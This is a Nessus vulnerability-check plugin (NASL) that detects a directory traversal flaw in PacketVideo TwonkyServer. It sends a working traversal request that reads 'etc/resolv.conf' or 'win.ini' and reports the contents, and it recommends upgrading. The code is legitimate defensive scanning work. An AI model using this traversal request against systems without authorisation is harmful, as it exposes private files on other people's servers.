#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(59242);
  script_version("$Revision: 1.3 $");
  script_cvs_date("$Date: 2015/09/24 23:21:19 $");

  script_bugtraq_id(53265);
  script_osvdb_id(81568);

  script_name(english:"PacketVideo TwonkyServer Directory Traversal");
  script_summary(english:"Checks for vulnerable installation of PacketVideo TwonkyServer.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a directory traversal
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The PacketVideo TwonkyServer listening on the remote host is affected
by a directory traversal vulnerability that can allow for a remote
attacker to view the contents of files located outside of the server's
root directory by sending a URI that contains directory traversal
characters.  The issue is exploitable regardless of having configured
the application's Secured Server Settings.");
  script_set_attribute(attribute:"see_also", value:"http://ddilabs.blogspot.com/2012/04/packetvideo-twonkyserver-and.html");
  script_set_attribute(attribute:"see_also", value:"http://www.twonkyforum.com/viewtopic.php?f=2&t=10692");
  script_set_attribute(attribute:"solution", value:"Upgrade to TwonkyServer 7.0.7 / TwonkyManager 3.0.1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/04/26");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/04/13");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/05/23");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/a:packetvideo:twonky");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2015 Tenable Network Security, Inc.");

  script_dependencies("packetvideo_twonky_detect.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 9000);
  script_require_keys("www/twonky");

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("audit.inc");

port = get_http_port(default:9000);

install = get_install_from_kb(appname:"twonky", port:port, exit_on_fail:TRUE);
dir = install["dir"];

# Determine what to look for.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os)
  {
     files = make_list('windows/win.ini', 'winnt/win.ini');
  }
  else
  {
    files = make_list('etc/resolv.conf');
  }
}
else files = make_list('etc/resolv.conf', 'windows/win.ini', 'winnt/win.ini');

file_pats = make_array();
file_pats['etc/resolv.conf'] = "nameserver (?:[0-9]{1,3}\.){3}[0-9]{1,3}$";
file_pats['winnt/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";
file_pats['windows/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";


foreach exp (files)
{
  vuln_url = dir + "/resources/../../../../../../../../../../" + exp;
  res = http_send_recv3(
    port         : port,
    method       : "GET",
    item         : vuln_url,
    exit_on_fail : TRUE
  );

  if (egrep(pattern:file_pats[exp], string:res[2]))
  {
    if (report_verbosity > 0)
    {
      report =
        '\nNessus was able to verify the issue exists using the following request : ' +
        '\n' +
        '\n  ' + build_url(port:port, qs:vuln_url) +
        '\n';

      if (report_verbosity > 1)
      {
        output = res[2];

        report +=
          '\n' + 'This produced the following output :' +
          '\n' +
          '\n' + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) +
          '\n' + chomp(output) +
          '\n' + crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
      }
      security_warning(port:port, extra:report);
    }
    else security_warning(port);
    exit(0);
  }
}
audit(AUDIT_INST_VER_NOT_VULN, "TwonkyServer");
